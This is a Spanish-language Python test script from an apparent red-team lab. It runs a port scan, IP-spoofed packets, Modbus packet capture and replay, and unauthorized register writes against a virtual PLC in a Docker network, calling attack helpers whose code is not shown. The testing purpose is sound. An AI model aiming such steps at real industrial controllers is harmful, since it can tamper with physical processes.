"""Prueba real de scan/replay/spoofing dentro de un contenedor Linux, contra
un PLCVirtual corriendo en otro contenedor de la misma red Docker. Esto es
lo que en Windows no se pudo validar sin Npcap.

Uso: python scripts/test_scapy_docker.py <host_objetivo>
"""

import sys
import threading
import time

from redteam.scan import escanear_rango
from redteam.replay import capturar_paquetes_modbus, reinyectar_paquetes
from redteam.spoofing import enviar_paquete_spoofed
from redteam.escritura_ilegitima import escribir_registro_no_autorizado
import asyncio

PUERTO = 502


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "plc"

    print(f"\n=== 1) SCAN contra {host}:{PUERTO} ===")
    resultados = escanear_rango([host], puerto=PUERTO, timeout=2.0)
    print("resultados:", resultados)
    assert resultados, f"el scan no encontro el servidor Modbus en {host}:{PUERTO}"
    print("OK: scan encontro el PLC real via scapy (SYN/SYN-ACK).")

    print(f"\n=== 2) SPOOFING contra {host}:{PUERTO} ===")
    enviar_paquete_spoofed(ip_origen_falsa="10.99.99.99", ip_destino=host, puerto_destino=PUERTO)
    print("OK: paquete spoofed enviado sin excepcion (IP origen falsificada).")

    print(f"\n=== 3) REPLAY contra {host}:{PUERTO} ===")
    print("iniciando captura en background y generando trafico EN SIMULTANEO...")

    capturados = []

    def _capturar():
        capturados.extend(capturar_paquetes_modbus(host_objetivo=host, cantidad=1, timeout=6.0))

    hilo_captura = threading.Thread(target=_capturar)
    hilo_captura.start()
    time.sleep(1.0)  # dar tiempo a que sniff() abra el socket antes de generar trafico
    for i in range(5):
        asyncio.run(escribir_registro_no_autorizado(host, PUERTO, direccion=1, valor=40 + i))
        time.sleep(0.3)
    hilo_captura.join()

    paquetes = capturados
    print(f"paquetes capturados: {len(paquetes)}")
    if paquetes:
        reinyectar_paquetes(paquetes)
        print("OK: replay capturo y reinyecto un paquete Modbus real.")
    else:
        print("ADVERTENCIA: no se capturo ningun paquete en la ventana de tiempo (revisar interfaz/timing).")

    print("\nTODO OK: scan/replay/spoofing verificados de verdad en Linux.")


if __name__ == "__main__":
    main()
